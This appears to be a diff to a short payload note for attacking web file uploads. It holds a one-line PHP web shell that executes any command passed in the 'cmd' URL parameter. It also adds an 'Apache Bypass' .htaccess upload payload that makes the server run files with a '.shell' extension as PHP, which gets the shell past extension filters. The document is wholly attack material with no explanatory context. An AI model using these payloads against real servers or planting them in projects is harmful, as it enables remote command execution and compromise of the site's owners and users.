@@ -1,1 +1,8 @@
 <?php system($_GET['cmd']); ?>
+
+#Apache Bypass
+
+filename=".htaccess"
+Content-Type: text/plain
+AddType application/x-httpd-php .shell
+
